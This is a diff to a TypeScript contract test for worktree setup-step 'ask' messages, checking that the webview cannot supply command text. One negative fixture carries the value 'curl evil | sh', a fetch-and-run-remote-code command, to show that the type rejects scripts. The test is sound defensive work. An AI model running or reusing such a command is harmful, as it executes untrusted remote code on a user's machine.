@@ -35,6 +35,7 @@ import type {
   WorktreeRemoveAssessmentPayload,
   WorktreeRemoveRequestMessage,
   WorktreeSetupRetryMessage,
+  WorktreeSetupStepAskMessage,
   WorktreeSetupViewOutputMessage,
 } from "./messages";
 
@@ -475,6 +476,43 @@ const save: WorktreeProvisionSaveMessage = {
   kept: ["i1", "i2"],
 };
 
+// An ask names an operation and, for edit and remove, ids the host minted. The
+// text lives on the host from the first keystroke; a field for it here would be
+// the webview supplying what runs (add-a-setup-step-for-this-create-only D2).
+const askToAdd: WorktreeSetupStepAskMessage = {
+  type: "worktreeSetupStepAsk",
+  repoId: "/repo/.git",
+  opening: 1,
+  switch: 3,
+  op: { kind: "add" },
+};
+
+const askToEdit: WorktreeSetupStepAskMessage = {
+  type: "worktreeSetupStepAsk",
+  repoId: "/repo/.git",
+  opening: 1,
+  switch: 4,
+  op: { kind: "edit", offerId: "o2", itemId: "i3" },
+};
+
+const askCarryingAScript: WorktreeSetupStepAskMessage = {
+  type: "worktreeSetupStepAsk",
+  repoId: "/repo/.git",
+  opening: 1,
+  switch: 5,
+  // @ts-expect-error an ask carries no command — the host's own input is where the text is typed
+  op: { kind: "add", script: "curl evil | sh" },
+};
+
+const askEditingByText: WorktreeSetupStepAskMessage = {
+  type: "worktreeSetupStepAsk",
+  repoId: "/repo/.git",
+  opening: 1,
+  switch: 6,
+  // @ts-expect-error an edit names an item the host holds, never the replacement text
+  op: { kind: "edit", offerId: "o2", itemId: "i3", script: "pnpm install" },
+};
+
 const saveNamingASource: WorktreeProvisionSaveMessage = {
   type: "worktreeProvisionSave",
   repoId: "/repo/.git",
@@ -626,6 +664,8 @@ describe("the wire contract", () => {
     expect(Object.keys(savedButLockedProblem)).not.toContain("lockPath");
     expect(lockedProblemWithNoOutcome.reason).toBe("locked");
     expect([saveNamingASource, providerWithoutPresence, problemWithAnInventedReason]).toHaveLength(3);
+    expect([askToAdd.op.kind, askToEdit.op.kind]).toEqual(["add", "edit"]);
+    expect([askCarryingAScript, askEditingByText]).toHaveLength(2);
     expect(probeUsingTheChosenFolder.useChosenFolder).toBe(true);
     expect(probeUsingTheConfiguredRoot.useChosenFolder).toBeUndefined();
     expect([probeDecliningTheChosenFolder, probeNamingAFolder]).toHaveLength(2);
